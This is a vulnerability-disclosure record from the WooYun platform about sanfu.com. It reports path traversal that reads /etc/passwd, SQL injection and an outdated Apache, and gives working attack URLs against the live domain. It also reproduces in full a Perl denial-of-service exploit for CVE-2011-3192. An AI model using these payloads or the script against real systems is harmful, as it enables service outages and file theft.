{"id": 56112, "wybug_id": "wooyun-2014-058859", "wybug_title": "三福百货任意文件读取漏洞", "wybug_corp": "sanfu.com", "wybug_author": "MyKings", "wybug_date": "2014-04-29 12:00", "wybug_open_date": "2014-06-13 12:01", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "错误信息未屏蔽"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-13：\t细节向公众公开  简要描述： 1.mod参数过滤不严格，可读取/etc/passwd文件。2.Apache版本过低，存在Dos攻击。3.存在sql注入。 详细说明：  \n由于对mod参数过滤不严格，通过\"../../../../../../../../../../etc/passwd%00.jpg\"可以访问到/etc/passwd文件内容\n\n\n\n\n\n\nsql注入：\n\nDos：CVE-2011-3192http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192没敢做Dos测试，这里贴出exp代码\n#Apache httpd Remote Denial of Service (memory exhaustion)#By Kingcope#Year 2011## Will result in swapping memory to filesystem on the remote side# plus killing of processes when running out of swap space.# Remote System becomes unstable.# http://www.exploit-db.com/exploits/17696/use IO::Socket;use Parallel::ForkManager;sub usage {\tprint \"Apache Remote Denial of Service (memory exhaustion)\\n\";\tprint \"by Kingcope\\n\";\tprint \"usage: perl killapache.pl <host> [numforks]\\n\";\tprint \"example: perl killapache.pl www.example.com 50\\n\";}sub killapache {print \"ATTACKING $ARGV[0] [using $numforks forks]\\n\";\t$pm = new Parallel::ForkManager($numforks);$|=1;srand(time());$p = \"\";for ($k=0;$k<1300;$k++) {\t$p .= \",5-$k\";}for ($k=0;$k<$numforks;$k++) {my $pid = $pm->start and next; \t\t$x = \"\";my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],                                 PeerPort => \"80\",                     \t\t\t Proto    => 'tcp');$p = \"HEAD / HTTP/1.1\\r\\nHost: $ARGV[0]\\r\\nRange:bytes=0-$p\\r\\nAccept-Encoding: gzip\\r\\nConnection: close\\r\\n\\r\\n\";print $sock $p;while(<$sock>) {} $pm->finish;}$pm->wait_all_children;print \":pPpPpppPpPPppPpppPp\\n\";}sub testapache {my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],                                 PeerPort => \"80\",                     \t\t\t Proto    => 'tcp');$p = \"HEAD / HTTP/1.1\\r\\nHost: $ARGV[0]\\r\\nRange:bytes=0-$p\\r\\nAccept-Encoding: gzip\\r\\nConnection: close\\r\\n\\r\\n\";print $sock $p;$x = <$sock>;if ($x =~ /Partial/) {\tprint \"host seems vuln\\n\";\treturn 1;\t} else {\treturn 0;\t}}if ($#ARGV < 0) {\tusage;\texit;\t}if ($#ARGV > 1) {\t$numforks = $ARGV[1];} else {$numforks = 50;}$v = testapache();if ($v == 0) {\tprint \"Host does not seem vulnerable\\n\";\texit;\t}while(1) {killapache();}\n   漏洞证明：  1.http://www.sanfu.com/?mod=../../../../../../../../../../etc/passwd%00.jpg2.http://www.sanfu.com/?class_new=0&do=index_new&mod=goods&orderby=is_hot&page=wooyun&per_page=32&price=-1&style=sale   修复方案：  1.严格过滤mod参数，过滤“.”、“/”字符。2.升级Apache 2.2.20以上版本。3.报了这么多肯定会有礼物吧：）   版权声明：转载请注明来源 MyKings@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-04-29 12:05 厂商回复： 感谢提交，修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}